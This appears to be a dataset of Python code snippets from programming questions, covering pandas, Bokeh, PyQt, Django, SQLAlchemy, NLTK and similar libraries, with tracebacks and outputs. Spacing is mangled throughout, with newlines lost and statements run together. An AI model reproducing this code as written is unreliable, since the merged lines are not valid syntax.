: ix.next ( ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -StopIteration Traceback ( most recent call last ) < ipython-input-252-29d4ae900c28 > in < module > ( ) -- -- > 1 ix.next ( ) < ipython-input-246-5479fdc9217b > in next ( self ) 10 else : 11 self.iter_loc = -1 -- - > 12 raise StopIteration 13 def __getitem__ ( self , idx ) : return self.lst.__getitem__ ( idx ) 14 def __setitem__ ( self , idx , itm ) : self.lst.__setitem__ ( idx , itm ) StopIteration : In [ 253 ] : ix = iter ( zz ) In [ 254 ] : ix.next ( ) Out [ 254 ] : 3In [ 255 ] : ix.next ( ) Out [ 255 ] : 3In [ 256 ] : ix.next ( ) Out [ 256 ] : 3In [ 257 ] : ix.next ( ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -StopIteration Traceback ( most recent call last ) < ipython-input-257-29d4ae900c28 > in < module > ( ) -- -- > 1 ix.next ( ) < ipython-input-246-5479fdc9217b > in next ( self ) 10 else : 11 self.iter_loc = -1 -- - > 12 raise StopIteration 13 def __getitem__ ( self , idx ) : return self.lst.__getitem__ ( idx ) 14 def __setitem__ ( self , idx , itm ) : self.lst.__setitem__ ( idx , itm ) StopIteration : In [ 258 ] : add_3 ( *zz ) Out [ 258 ] : 9In [ 259 ] : zz [ 0 ] Out [ 259 ] : 1In [ 260 ] : zz [ 1 ] Out [ 260 ] : 2In [ 261 ] : zz [ 2 ] Out [ 261 ] : 3In [ 262 ] : [ x for x in zz ] Out [ 262 ] : [ 3 , 3 , 3 ]"
"testEqual ( is_rightangled ( 1.5,2.0,2.5 ) , True ) testEqual ( is_rightangled ( 4.0,8.0,16.0 ) , False ) testEqual ( is_rightangled ( 4.1,8.2,9.1678787077 ) , True ) testEqual ( is_rightangled ( 4.1,8.2,9.16787 ) , True ) testEqual ( is_rightangled ( 4.1,8.2,9.168 ) , False ) testEqual ( is_rightangled ( 0.5,0.4,0.64031 ) , True ) from test import testEqualImportError : can not import name testEqual"
"array ( [ [ 1. , 2. , 3 . ] , [ 4. , 5. , 6 . ] , [ 7. , 8. , 9 . ] ] ) array ( [ [ 1. , 2. , 3 . ] , [ 4. , 5. , 6 . ] , [ 7. , 8. , 9 . ] ] , [ [ 1. , 2. , 3 . ] , [ 4. , 5. , 6 . ] , [ 7. , 8. , 9 . ] ] , [ [ 1. , 2. , 3 . ] , [ 4. , 5. , 6 . ] , [ 7. , 8. , 9 . ] ] ] )"
"import abcimport copyclass Life ( object ) : __metaclass__ = abc.ABCMeta @ abc.abstractmethod def reproduce ( self ) : passclass Bacterium ( Life ) : def reproduce ( self ) : return copy.deepcopy ( self ) wiggly = Bacterium ( ) print wiggly.__class__.__mro__ # ( < class '__main__.Bacterium ' > , < class '__main__.Life ' > , < type 'object ' > ) print wiggly.__class__.mro ( ) # [ < class '__main__.Bacterium ' > , < class '__main__.Life ' > , < type 'object ' > ]"
"import sysfrom time import sleeptry : sleep ( 5 ) except KeyboardInterrupt , ke : sys.exit ( 0 )"
"INFO : tornado.access:200 POST /bokeh/bb/71cee48b-5122-4275-bd4f-d137ea1374e5/gc ( ... ) 222.55msINFO : tornado.access:200 GET /bokeh/bb/71cee48b-5122-4275-bd4f-d137ea1374e5/ ( ... ) 110.15msINFO : tornado.access:200 POST /bokeh/bb/71cee48b-5122-4275-bd4f-d137ea1374e5/gc ( ... ) 232.66msINFO : tornado.access:200 GET /bokeh/bb/71cee48b-5122-4275-bd4f-d137ea1374e5/ ( ... ) 114.16ms def get_bokeh_url ( self , context ) : t = Thread ( target=self.run ) t.start ( ) return self.session.object_link ( self.document.context ) def run ( self ) : return self.session.poll_document ( self.document )"
"print u'\u0110 \u0110 ' + '\n ' ( a character cmd ca n't display ) ( character what i want ) Traceback ( most recent call last ) : File `` b.py '' , line 26 , in < module > print u'\u0110 \u0110 ' IOError : [ Errno 2 ] No such file or directory print u ' \u0110 \u0110 ' + '\n ' ( a space ) ( charecter what i want ) ( character what i want ) Traceback ( most recent call last ) : File `` b.py '' , line 26 , in < module > print u ' \u0110 \u0110 ' + '\n'IOError : [ Errno 2 ] No such file or directory"
"> > > from _collections import deque , defaultdict > > > inspect.getfile ( deque ) '/usr/lib/python2.7/collections.pyc ' > > > inspect.getfile ( collections ) '/usr/lib/python2.7/collections.pyc ' > > > inspect.getfile ( _collections ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /usr/lib/python2.7/inspect.py '' , line 403 , in getfile raise TypeError ( ' { ! r } is a built-in module'.format ( object ) ) TypeError : < module '_collections ' ( built-in ) > is a built-in module > > >"
"def func ( **kwargs ) : for key , value in kwargs.items ( ) : # Is key always going to be a string ? # Could it have spaces ? pass"
"def _get_referers ( self ) : db = object_session ( self ) cls , ident = identity_key ( instance=self ) medatada = cls.__table__.metadata result = { } # _mapped_models is my extension . It is collected by metaclass , so I did n't # look for other ways to find all model classes . for other_class in medatada._mapped_models : queries = { } for prop in class_mapper ( other_class ) .iterate_properties : if not ( isinstance ( prop , PropertyLoader ) and \ issubclass ( cls , prop.mapper.class_ ) ) : continue query = db.query ( prop.parent ) comp = prop.comparator if prop.uselist : query = query.filter ( comp.contains ( self ) ) else : query = query.filter ( comp==self ) count = query.count ( ) if count : queries [ prop ] = ( count , query ) if queries : result [ other_class ] = queries return result"
my_app < command.file
"df = pd.DataFrame ( [ [ '504145 ' , 12000.0 ] , [ '555933 ' , 23010.5 ] ] , columns= [ 'Product Id ' , 'Amount ' ] ) dfOut [ 1 ] : Product Id Amount0 504145 12000.01 555933 23010.5 Product Id Amount Description0 504145 12000.0 Amount is 12000.01 555933 23010.5 Amount is 23010.5 df [ 'Description ' ] = f'Amount is { df [ `` Amount '' ] .astype ( str ) } 'dfOut [ 2 ] : Product Id Amount Description0 504145 12000.0 Amount is 0 12000.0\n1 23010.5\nName : Am ... 1 555933 23010.5 Amount is 0 12000.0\n1 23010.5\nName : Am ... df [ 'Description ' ] = `` Amount is `` + df [ `` Amount '' ] .astype ( str ) dfOut [ 9 ] : Product Id Amount Description0 504145 12000.0 Amount is 12000.01 555933 23010.5 Amount is 23010.5"
"Size is ( 150 , 200 ) Putting in ( 50 , 125 ) - This point should return ( 50.0 , 75.0 ) Before show ( ) : PyQt5.QtCore.QPointF ( 84.0 , -20.0 ) After show ( ) : PyQt5.QtCore.QPointF ( 50.0 , 75.0 ) import numpy as npfrom PyQt5.QtCore import pyqtSignal , pyqtSlot , QPointF , QPointfrom PyQt5.QtWidgets import ( QDialog , QGraphicsView , QGraphicsScene , QVBoxLayout , QPushButton , QApplication , QSizePolicy ) from PyQt5.QtGui import QPixmap , QImageclass MyView ( QGraphicsView ) : `` '' '' View subclass that emits mouse events in the scene coordinates . '' '' '' mousedown = pyqtSignal ( QPointF ) def __init__ ( self , *args , **kwargs ) : super ( ) .__init__ ( *args , **kwargs ) self.setSizePolicy ( QSizePolicy.Fixed , QSizePolicy.Fixed ) # This is the key thing I need self.scale ( 1 , -1 ) def mousePressEvent ( self , event ) : return self.mousedown.emit ( self.mapToScene ( event.pos ( ) ) ) class SimplePicker ( QDialog ) : def __init__ ( self , data , parent=None ) : super ( ) .__init__ ( parent=parent ) # Get a grayscale image bdata = ( ( data - data.min ( ) ) / ( data.max ( ) - data.min ( ) ) * 255 ) .astype ( np.uint8 ) wid , hgt = bdata.shape img = QImage ( bdata.T.copy ( ) , wid , hgt , wid , QImage.Format_Indexed8 ) # Construct a scene with pixmap self.scene = QGraphicsScene ( 0 , 0 , wid , hgt , self ) self.scene.setSceneRect ( 0 , 0 , wid , hgt ) self.px = self.scene.addPixmap ( QPixmap.fromImage ( img ) ) # Construct the view and connect mouse clicks self.view = MyView ( self.scene , self ) self.view.mousedown.connect ( self.mouse_click ) # End button self.doneb = QPushButton ( 'Done ' , self ) self.doneb.clicked.connect ( self.accept ) # Layout layout = QVBoxLayout ( self ) layout.addWidget ( self.view ) layout.addWidget ( self.doneb ) @ pyqtSlot ( QPointF ) def mouse_click ( self , xy ) : print ( ( xy.x ( ) , xy.y ( ) ) ) if __name__ == `` __main__ '' : # Fake data x , y = np.mgrid [ 0:4*np.pi:150j , 0:4*np.pi:200j ] z = np.sin ( x ) * np.sin ( y ) qapp = QApplication.instance ( ) if qapp is None : qapp = QApplication ( [ 'python ' ] ) pick = SimplePicker ( z ) print ( `` Size is ( 150 , 200 ) '' ) print ( `` Putting in ( 50 , 125 ) - This point should return ( 50.0 , 75.0 ) '' ) p0 = QPoint ( 50 , 125 ) print ( `` Before show ( ) : '' , pick.view.mapToScene ( p0 ) ) pick.show ( ) print ( `` After show ( ) : '' , pick.view.mapToScene ( p0 ) ) qapp.exec_ ( )"
"func_list = [ lambda x : function1 ( input ) , lambda x : function2 ( input ) , lambda x : function3 ( input ) , lambda x : x ]"
"for o in dir ( ) : f=open ( o ) pickle ( o_as_object , f )"
"from Tkinter import *def handle_it ( event ) : # print `` event handler '' print event.dataroot = Tk ( ) root.after ( 1 , lambda : root.event_generate ( ' < < test > > ' , data= '' hi there '' ) ) root.bind ( ' < < test > > ' , handle_it ) root.mainloop ( )"
from nltk.book import * text1 = Text ( gutenberg.words ( 'melville-moby_dick.txt ' ) ) tokens = list ( tokens ) for tok in self.iterate_from ( self._toknum [ -1 ] ) : pass tokens = self.read_block ( self._stream )
"{ % wrap template='wrapper.html.j2 ' ... % } < img src= '' { { url ( 'image : thumbnail ' ... } } '' > { % endwrap % } < div > some ifs and stuff { { content } } more ifs and stuff < /div > class WrapExtension ( Extension ) : tags = set ( [ 'wrap ' ] ) def parse ( self , parser ) : node = nodes.Scope ( lineno=next ( parser.stream ) .lineno ) assignments = [ ] while parser.stream.current.type ! = 'block_end ' : lineno = parser.stream.current.lineno if assignments : parser.stream.expect ( 'comma ' ) target = parser.parse_assign_target ( ) parser.stream.expect ( 'assign ' ) expr = parser.parse_expression ( ) assignments.append ( nodes.Assign ( target , expr , lineno=lineno ) ) content = parser.parse_statements ( ( 'name : endwrap ' , ) , drop_needle=True ) assignments.append ( nodes.Name ( 'content ' , content ) ) assignments.append ( nodes.Include ( nodes.Template ( 'wrapper.html.j2 ' ) , True , False ) ) node.body = assignments return node"
"class MyProperty ( object ) : def __init__ ( self , fget ) : self.fget = fget def __get__ ( self , obj , objtype=None ) : print 'IN MyProperty.__get__ ' return self.fget ( obj ) class MyClassMethod ( object ) : def __init__ ( self , f ) : self.f = f def __get__ ( self , obj , objtype=None ) : print 'IN MyClassMethod.__get__ ' def f ( *args , **kwargs ) : return self.f ( objtype , *args , **kwargs ) return f class A ( object ) : # does n't work : @ MyProperty @ MyClassMethod def klsproperty ( cls ) : return 555 # works : @ MyProperty def prop ( self ) : return 111 # works : @ MyClassMethod def klsmethod ( cls , x ) : return x**2 % print A.klspropertyIN MyProperty.__get__ ... TypeError : 'MyClassMethod ' object is not callable class NoopDescriptor ( object ) : def __init__ ( self , f ) : self.f = f def __get__ ( self , obj , objtype=None ) : print 'IN NoopDescriptor.__get__ ' return self.f.__get__ ( obj , objtype=objtype ) class B ( object ) : # works : @ NoopDescriptor @ MyProperty def prop1 ( self ) : return 888 # does n't work : @ MyProperty @ NoopDescriptor def prop2 ( self ) : return 999 % print B ( ) .prop1IN NoopDescriptor.__get__IN MyProperty.__get__888 % print B ( ) .prop2IN MyProperty.__get__ ... TypeError : 'NoopDescriptor ' object is not callable"
"class Order ( models.Model ) : ... status = models.PositiveIntegerField ( default=0 , choices=ORDER_STATUSES ) ... class ACS ( models.Model ) : status = models.IntegerField ( default=-1 , choices=STATUSES ) order = models.ForeignKey ( Order , blank=True , null=True ) ... class ACSForm ( forms.ModelForm ) : status = forms.ChoiceField ( choices=STATUSES , widget=forms.Select ( attrs= { 'class ' : 'form-control ' } ) ) ... class Meta : model = ACS fields = ( 'status ' , ) class OrderACSEditForm ( forms.ModelForm ) : status = forms.ChoiceField ( choices=ORDER_STATUSES , widget=forms.Select ( attrs= { 'class ' : 'form-control ' } ) ) class Meta : model = Order fields = ( 'status ' , ) def edit ( request , item_id= '' '' ) : data = ACS.objects.get ( pk=item_id ) form = ACSForm ( instance=data ) order = Order.objects.get ( id=data.order.id ) form_edit = OrderACSEditForm ( instance=order ) if request.POST : form = ACSForm ( request.POST , instance=data ) form_edit = OrderACSEditForm ( request.POST ) if form.is_valid ( ) and form_edit.is_valid ( ) : form_edit.save ( ) obj = form.save ( ) messages.add_message ( request , messages.SUCCESS , 'Your data successfully saved . ' ) if request.POST [ 'action ' ] == `` save_stay '' : return redirect ( `` /panel/packages/acs/edit/ '' + str ( obj.id ) ) else : return redirect ( `` /panel/packages/acs/ '' ) return render ( request , 'ui/packages/acs/edit.html ' , dict ( data=data , form=form , form_edit=form_edit , item_id=item_id ) ) < div class= '' form-group { % if form.status.errors % } has-error { % endif % } '' > < label > { % trans `` Status '' % } < /label > { % if form.status.errors % } { % for error in form.status.errors % } < label class= '' control-label '' > { { error } } < /label > { % endfor % } { % endif % } { { form.status } } < /div > < div class= '' form-group { % if form_edit.status.errors % } has-error { % endif % } '' > < label > { % trans `` Order status '' % } < /label > { % if form_edit.status.errors % } { % for error in form_edit.status.errors % } < label class= '' control-label '' > { { error } } < /label > { % endfor % } { % endif % } { { form_edit.status } } < /div >"
"import pandas as pd from tqdm import tqdm_notebook , tqdm_pandas tqdm_notebook ( ) .pandas ( ) df = pd.DataFrame ( { ' a ' : [ 'foo ' , 'bar ' ] , ' b ' : [ 'spam ' , 'eggs ' ] } ) df.progress_apply ( lambda row : row [ ' a ' ] + row [ ' b ' ] , axis = 1 ) from tqdm import tqdmfor i in tqdm ( range ( len ( df ) ) ) : pass"
"Traceback ( most recent call last ) : File `` s.py '' , line 10 , in < module > xslt = ET.XSLT ( ET.parse ( d ) ) File `` xslt.pxi '' , line 409 , in lxml.etree.XSLT.__init__ ( src/lxml/lxml.etree.c:151978 ) lxml.etree.XSLTParseError : Invalid expression"
"import pandas as pddf = pd.DataFrame ( { ' A ' : { 0 : '2019-06-01 ' , 1 : '2019-06-01 ' , 2 : '2019-06-01 ' } , ' B ' : { 0 : '10 ' , 1 : '20 ' , 2 : '30 ' } , ' C ' : { 0 : '10 ' , 1 : '20 % ' , 2 : '30 % ' } , 'D ' : { 0 : '10 % ' , 1 : '20 % ' , 2 : '30 ' } , } ) A B C D0 2019-06-01 10 10 10 % 1 2019-06-01 20 20 % 20 % 2 2019-06-01 30 30 % 30 col_list = [ ] for col in df.columns : if ( True in list ( df [ col ] .str.contains ( ' % ' ) ) ) is True : col_list.append ( col ) [ ' C ' , 'D ' ]"
"altair.Chart ( ys.reset_index ( ) ) .mark_line ( point=True , strokeWidth=5 ) .encode ( x= '' Time : T '' , y= '' HL : Q '' , color=altair.Color ( `` Time Series Component '' , scale=altair.Scale ( scheme= '' dark2 '' ) ) , tooltip= [ `` Time Series Component '' , `` Time '' , `` HL '' ] ) .interactive ( ) .properties ( width=1000 , height=500 ) .configure_axis ( labelFontSize=20 , titleFontSize=20 ) .configure_legend ( orient= '' right '' )"
"mainWindow = new BrowserWindow ( { width : 1000 , height : 700 , show : false , } ) var PythonShell = require ( 'python-shell ' ) ; var options = { mode : 'text ' , pythonPath : 'python3 ' , pythonOptions : [ '-m ' ] , scriptPath : `` , args : [ 'serve ' , 'bokeh_project/ ' ] } ; PythonShell.run ( 'bokeh ' , options , function ( err , results ) { if ( err ) throw err ; console.log ( 'results : % j ' , results ) ; } ) ; mainWindow.loadURL ( 'http : //localhost:5006 ' ) ; mainWindow.once ( 'did-finish-load ' , ( ) = > { mainWindow.show ( ) } )"
def f ( ) : print x def g ( ) global x x = 3
class SomeClass : SOME_CONST = `` hello '' SOME_OTHER_CONST = SomeClass.SOME_CONST + `` world ''
"> > > a = object ( ) > > > a.hhh = 1 Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > AttributeError : 'object ' object has no attribute 'hhh ' > > > def f ( ) : ... return 1 ... > > > f.hhh = 1"
"import matplotlib.pyplot as pltimport numpy as npfig = plt.figure ( ) ax = fig.add_subplot ( 111 ) x = np.linspace ( 0 , 2 , 1000 ) y = x**2ax.plot ( x , y ) x , y = ( 1.0 , 1.0 ) grad = 2.0 # Fixed size , wrong directionlen_pts = 40end_xy = ( len_pts , len_pts*grad ) ax.annotate ( `` '' , xy= ( x , y ) , xycoords='data ' , xytext=end_xy , textcoords='offset points ' , arrowprops=dict ( arrowstyle= ' < - ' , connectionstyle= '' arc3 '' ) ) # Fixed direction , wrong sizelen_units = 0.2end_xy = ( x+len_units , y+len_units*grad ) ax.annotate ( `` '' , xy= ( x , y ) , xycoords='data ' , xytext=end_xy , textcoords='data ' , arrowprops=dict ( arrowstyle= ' < - ' , connectionstyle= '' arc3 '' ) ) ax.axis ( ( 0,2,0,2 ) ) plt.show ( )"
"from random import randintimport pandas as pddf = pd.DataFrame ( { `` ID '' : [ `` a '' , `` b '' , `` c '' , `` d '' , `` e '' , `` f '' , `` g '' ] , `` Size '' : [ randint ( 0,9 ) for i in range ( 0,7 ) ] } ) df ID Size0 a 41 b 32 c 03 d 24 e 95 f 56 g 3 sums_df a b c d e f ga 8.0 7.0 4.0 6.0 13.0 9.0 7.0b 7.0 6.0 3.0 5.0 12.0 8.0 6.0c 4.0 3.0 0.0 2.0 9.0 5.0 3.0d 6.0 5.0 2.0 4.0 11.0 7.0 5.0e 13.0 12.0 9.0 11.0 18.0 14.0 12.0f 9.0 8.0 5.0 7.0 14.0 10.0 8.0g 7.0 6.0 3.0 5.0 12.0 8.0 6.0 sums_df = pd.DataFrame ( ) for i in range ( len ( df ) ) : for j in range ( len ( df ) ) : sums_df.loc [ i , j ] = df.Size [ i ] + df.Size [ j ] sums_df.index = list ( df.ID ) sums_df.columns = list ( df.ID )"
"File `` /path/to/somefile.py '' , line 272 , in somefile sm = -0.5 * ( wv [ 0 ] **2 . / sm2 + numpy.log ( 2 . * numpy.pi * sm2 ) ) TypeError : issubclass ( ) arg 2 must be a class or tuple of classes tmp = numpy.log ( 2 . * numpy.pi * sm2 ) > > > import numpy > > > numpy.__version__ ' 1.6.2 ' try : tmp = numpy.log ( 2 . * numpy.pi * sm2 ) except TypeError : print type ( sm2 ) , 2 . * numpy.pi * sm2 < type 'numpy.float64 ' > 0.0 > > > import numpy > > > numpy.log ( 0 . ) __main__:1 : RuntimeWarning : divide by zero encountered in log-inf"
import olap.xmla.xmla as xmlap = xmla.XMLAProvider ( ) c = p.connect ( location= '' powerbi : //api.powerbi.com/v1.0/myorg/ [ My Workspace ] '' ) [ ... ] TransportError : Server returned HTTP status 404 ( no content available )
"cookie = Cookie.SimpleCookie ( ) cookie.load ( cookie_string ) print 'cookie = ' , cookie print cookie [ 'Domain ' ] print cookie [ 'Domain ' ] .valueprint cookie [ 'Cycle ' ] [ 'Domain ' ] .value"
"@ db_sessiondef get_orders_of_the_week ( self , user , date ) : q = select ( o for o in Order for s in o.supplier if o.user == user ) q2 = q.filter ( lambda o : o.date > = date and o.date < = date+timedelta ( days=7 ) ) res = q2 [ : ] # for r in res : # print r.supplier.name return res { % for order in res % } Supplier : { { order.supplier.name } } { % endfor % } DatabaseSessionIsOver : Can not load attribute Supplier [ 3 ] .name : the database session is over"
https : //www.facebook.com/dialog/oauth ? client_id=YOUR_APP_ID & redirect_uri=https : //www.facebook.com/connect/login_success.html
"from nltk.corpus import shakespeare # XMLCorpusreadershakespeare.fileids ( ) [ 'a_and_c.xml ' , 'dream.xml ' , 'hamlet.xml ' , 'j_caesar.xml ' , ... ] play = shakespeare.xml ( 'dream.xml ' ) # ElementTree objectprint ( play ) < Element 'PLAY ' at ... > for i in range ( 9 ) : print ( ' % s : % s ' % ( play [ i ] .tag , play [ i ] .text ) ) TITLE : A Midsummer Night 's DreamPERSONAE : SCNDESCR : SCENE Athens , and a wood near it.PLAYSUBT : A MIDSUMMER NIGHT 'S DREAMACT : NoneACT : NoneACT : NoneACT : NoneACT : None"
"public void Send ( SSLMsg m ) { string json = m.Serialize ( ) ; byte [ ] data = Encoding.ASCII.GetBytes ( json ) ; ulong dataLen = ( ulong ) data.Length ; byte [ ] dataLenPacked = packIt ( dataLen ) ; Log ( `` Sending `` + dataLen + `` `` + json ) ; sslStream.Write ( dataLenPacked ) ; sslStream.Write ( data ) ; sslStream.Flush ( ) ; } private byte [ ] packIt ( ulong n ) { byte [ ] bArr = BitConverter.GetBytes ( n ) ; if ( BitConverter.IsLittleEndian ) Array.Reverse ( bArr , 0 , 8 ) ; return bArr ; } ( length , ) = unpack ( ' > Q ' , data ) # len ( data ) is 8 here # length is 1658170187863248538 ( length , ) = unpack ( ' > Q ' , data ) # len ( data ) is 8 here # length is 13330654897016668160L ( length , ) = unpack ( ' < Q ' , data ) # len ( data ) is 8 here # length is 185 while ( True ) : r , w , e = select.select ( ... ) for c in r : if ( c == socket ) : connection_accept ( c ) else # c is SSL wrapped at this point read = 0 data = [ ] while ( read ! = 8 ) : bytes = c.recv ( min ( 8-read , 8 ) ) read += len ( bytes ) data.append ( bytes ) joinedData = `` .join ( data ) # the below length is 13330654897016668160L # I am expecting it to be 185 ( length , ) = unpack ( ' > Q ' , joinedData ) # the below length is 185 , it should not be however # since the bytes were sent in big-endian ( length , ) = unpack ( ' < Q ' , joinedData )"
"names = [ 'apple ' , 'orange ' , 'banana ' ] apple = [ ] orange = [ ] banana = [ ]"
> > > import re > > > template = re.compile ( `` ( \w+ ) +\ . `` ) > > > target = `` a '' * 30 > > > template.search ( target )
"class Guest ( Base ) : __tablename__ = 'guest ' id = Column ( Integer , primary_key=True ) name = Column ( String ( 50 ) ) surname = Column ( String ( 50 ) ) email = Column ( String ( 255 ) ) [ .. ] deleted = Column ( Date , default=None ) SELECT id , name , surname , email , COUNT ( * ) OVER ( ) AS total FROM guest WHERE ( deleted IS NULL ) ORDER BY id ASC LIMIT 50 OFFSET 0 query = session.query ( Guest ) query = query.filter ( Login.deleted == None ) query = query.order_by ( Guest.id.asc ( ) ) query = query.offset ( 0 ) query = query.limit ( 50 ) result = query.all ( ) from sqlalchemy import funcquery = session.query ( func.count ( Guest.id ) ) query = query.filter ( Login.deleted == None ) result = query.scalar ( )"
"> > > data = ( ( 0 , 16777215 , 'ZZ ' ) , ... ( 1000013824 , 1000079359 , 'CN ' ) , ... ( 1000079360 , 1000210431 , 'JP ' ) , ... ( 1000210432 , 1000341503 , 'JP ' ) , ... ( 1000341504 , 1000603647 , 'IN ' ) ) > > > ip_to_lookup = 999 > > > country_result = [ country ... for ( from , to , country ) in data ... if ( ip_to_lookup > = from ) and ... ( ip_to_lookup < = to ) ] [ 0 ] > > > print country_resultZZ"
"import pandas as pdimport numpy as npfrom bokeh import eventsfrom bokeh.models import ( Select , Column , Row , ColumnDataSource , HoverTool , Range1d , LinearAxis , GeoJSONDataSource ) from bokeh.plotting import figurefrom bokeh.io import curdocimport osimport datetimefrom collections import OrderedDictdef make_plot ( src ) : # function to create the line chart p = figure ( width=500 , height=200 , x_axis_type='datetime ' , title='Some parameter ' , tools= [ 'xwheel_zoom ' , 'xpan ' ] , logo=None , toolbar_location='below ' , toolbar_sticky=False ) p.circle ( 'index ' , 'var1 ' , color='black ' , fill_alpha=0.2 , size=10 , source=src ) return pdef make_geo_plot ( src ) : # function to create the spatial plot with polygons p = figure ( width=300 , height=300 , title= '' Select area '' , tools= [ 'tap ' , 'pan ' , 'box_zoom ' , 'wheel_zoom ' , 'reset ' ] , logo=None ) p.patches ( 'xs ' , 'ys ' , fill_alpha=0.2 , fill_color='black ' , line_color='black ' , line_width=0.5 , source=src ) p.on_event ( events.SelectionGeometry , update_plot_from_geo ) return pdef update_plot_from_geo ( event ) : # update the line chart based on the selected polygon selected = geo_source.selected [ '1d ' ] [ 'indices ' ] if ( len ( selected ) > 0 ) : first = selected [ 0 ] print ( geo_source.selected [ '1d ' ] [ 'indices ' ] ) def update_plot ( attrname , old , new ) : # Callback for the dropdown menu which updates the line chart new_src = get_source ( df , area_select.value ) src.data.update ( new_src.data ) def get_source ( df , fieldid ) : # function to get a subset of the multi-hierarchical DataFrame # slice 'out ' the selected area dfsub = df.xs ( fieldid , axis=1 , level=0 ) src = ColumnDataSource ( dfsub ) return src # example timeseriesn_points = 100df = pd.DataFrame ( { ( 'area_a ' , 'var1 ' ) : np.sin ( np.linspace ( 0,5 , n_points ) ) + np.random.rand ( 100 ) *0.1 , ( 'area_b ' , 'var1 ' ) : np.sin ( np.linspace ( 0,2 , n_points ) ) + np.random.rand ( 100 ) *0.1 , ( 'area_c ' , 'var1 ' ) : np.sin ( np.linspace ( 0,3 , n_points ) ) + np.random.rand ( 100 ) *0.1 , ( 'area_d ' , 'var1 ' ) : np.sin ( np.linspace ( 0,4 , n_points ) ) + np.random.rand ( 100 ) *0.1 } , index=pd.DatetimeIndex ( start='2017-01-01 ' , freq= 'D ' , periods=100 ) ) # example polygonsgeojson = `` '' '' { `` type '' : '' FeatureCollection '' , '' crs '' : { `` type '' : '' name '' , '' properties '' : { `` name '' : '' urn : ogc : def : crs : OGC:1.3 : CRS84 '' } } , '' features '' : [ { `` type '' : '' Feature '' , '' properties '' : { `` key '' : '' area_a '' } , '' geometry '' : { `` type '' : '' MultiPolygon '' , '' coordinates '' : [ [ [ [ -108.8,42.7 ] , [ -104.5,42.0 ] , [ -108.3,39.3 ] , [ -108.8,42.7 ] ] ] ] } } , { `` type '' : '' Feature '' , '' properties '' : { `` key '' : '' area_b '' } , '' geometry '' : { `` type '' : '' MultiPolygon '' , '' coordinates '' : [ [ [ [ -106.3,44.0 ] , [ -106.2,42.6 ] , [ -103.3,42.6 ] , [ -103.4,44.0 ] , [ -106.3,44.0 ] ] ] ] } } , { `` type '' : '' Feature '' , '' properties '' : { `` key '' : '' area_d '' } , '' geometry '' : { `` type '' : '' MultiPolygon '' , '' coordinates '' : [ [ [ [ -104.3,41.0 ] , [ -101.5,41.0 ] , [ -102.9,37.8 ] , [ -104.3,41.0 ] ] ] ] } } , { `` type '' : '' Feature '' , '' properties '' : { `` key '' : '' area_c '' } , '' geometry '' : { `` type '' : '' MultiPolygon '' , '' coordinates '' : [ [ [ [ -105.8,40.3 ] , [ -108.3,37.7 ] , [ -104.0,37.4 ] , [ -105.8,40.3 ] ] ] ] } } ] } '' '' '' geo_source = GeoJSONDataSource ( geojson=geojson ) # populate a drop down menu with the area 's area_ids = sorted ( df.columns.get_level_values ( 0 ) .unique ( ) .values.tolist ( ) ) area_ids = [ str ( x ) for x in area_ids ] area_select = Select ( value=area_ids [ 0 ] , title='Select area ' , options=area_ids ) area_select.on_change ( 'value ' , update_plot ) src = get_source ( df , area_select.value ) p = make_plot ( src ) pgeo = make_geo_plot ( geo_source ) # add to documentcurdoc ( ) .add_root ( Row ( Column ( area_select , p ) , pgeo ) )"
"unreal.EditorLevelLibrary ( ) .spawn_actor_from_class ( ue.Class ( name='StaticMeshActor ' ) , location , rot ) LogPython : Error : TypeError : EditorLevelLibrary : Failed to convert parameter 'actor_class ' when calling function 'EditorLevelLibrary.SpawnActorFromClass ' on 'Default__EditorLevelLibrary'LogPython : Error : TypeError : NativizeProperty : Can not nativize 'Class ' as 'ActorClass ' ( ClassProperty ) LogPython : Error : TypeError : NativizeClass : Can not nativize 'Class ' as 'Class ' ( allowed Class type : 'Actor ' )"
"import pickleimport time # utf8import pandas as pdimport numpy as npfrom hyperopt import fmin , tpe , hp , STATUS_OK , Trialsdef objective ( x ) : return { 'loss ' : x ** 2 , 'status ' : STATUS_OK , # -- store other results like this 'eval_time ' : time.time ( ) , 'other_stuff ' : { 'type ' : None , 'value ' : [ 0 , 1 , 2 ] } , # -- attachments are handled differently 'attachments ' : { 'time_module ' : pickle.dumps ( time.time ) } } trials = Trials ( ) best = fmin ( objective , space=hp.qloguniform ( ' x ' , np.log ( 0.001 ) , np.log ( 0.1 ) , np.log ( 0.001 ) ) , algo=tpe.suggest , max_evals=100 , trials=trials ) pd.DataFrame ( trials.trials ) hp.qloguniform ( ' x ' , 0.001,0.1 , 0.001 )"
"lsof | grep my.log self.logger = logging.getLogger ( `` FPA '' ) try : if self.logger.handlers [ 0 ] .__class__.__name__== '' FileHandler '' : pass except Exception , e : print 'new filehandler added'+str ( e ) ch = logging.FileHandler ( FPA_LOG_TARGET ) formatter = logging.Formatter ( `` % ( asctime ) s - % ( levelname ) s - % ( message ) s - % ( pathname ) s @ line % ( lineno ) d '' ) ch.setFormatter ( formatter ) self.logger.setLevel ( logging.DEBUG ) self.logger.addHandler ( ch )"
> > > dNameError : name 'd ' is not defined > > > % alias d date > > > dFri May 15 00:12:20 AEST 2015
"{ `` filter '' : { `` and '' : [ { `` not '' : { `` term '' : { `` uuid '' : '' 60507f9e-01c1-11e5-a369-34363bd16ec4 '' } } } , { `` term '' : { `` brand_id '' :22212 } } ] } , `` query '' : { `` bool '' : { `` minimum_should_match '' :1 , `` should '' : [ { `` match '' : { `` name '' : { `` query '' : '' spork '' , `` boost '' :3 } } } , { `` match '' : { `` categories '' : { `` slop '' :10 , `` type '' : '' phrase '' , `` query '' : '' household plates , bowls , cups & flatware '' } } } ] , `` must_not '' : [ ] , `` must '' : [ { `` match '' : { `` name_analyzed '' : { `` boost '' :4 , `` query '' : '' spork '' , `` type '' : '' phrase '' , `` slop '' :15 } } } ] } } } elasticsearch.msearch ( list_of_search_queries )"
